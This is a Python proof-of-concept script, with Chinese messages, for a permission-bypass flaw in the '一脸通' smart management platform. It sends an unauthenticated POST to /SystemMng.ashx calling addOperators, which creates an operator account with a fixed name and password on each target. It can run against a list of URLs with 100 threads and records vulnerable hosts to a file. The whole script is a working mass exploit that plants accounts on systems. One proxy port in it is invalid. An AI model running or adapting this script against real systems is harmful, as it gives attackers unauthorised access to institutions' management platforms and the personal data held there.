import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="一脸通智慧管理平台权限绕过漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload_url = '/SystemMng.ashx'
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding':'gzip, deflate',
        'Accept':'*/*',
        'Connection':'close',
        'Accept-Language':'en',
        'Content-Length':'174',
    }
    data = {
        'operatorName':'test123456',
        'operatorPw':'123456',
        'operpassword':'123456',
        'operatorRole':'00',
        'visible_jh':'%E8%AF%B7%E9%80%89%E6%8B%A9',
        'visible_dorm':'%E8%AF%B7%E9%80%89%E6%8B%A9',
        'funcName':'addOperators'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:80080'
    }
    
    try:
        res = requests.post(url=url,headers=headers,data=data,proxies=proxies,timeout=5,verify=False)
        
        if res.status_code == 200:
            print(f"{GREEN}[+]该网站存在权限绕过漏洞，url为{target}\n{RESET}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在权限绕过漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")
if __name__ == '__main__':
    main()
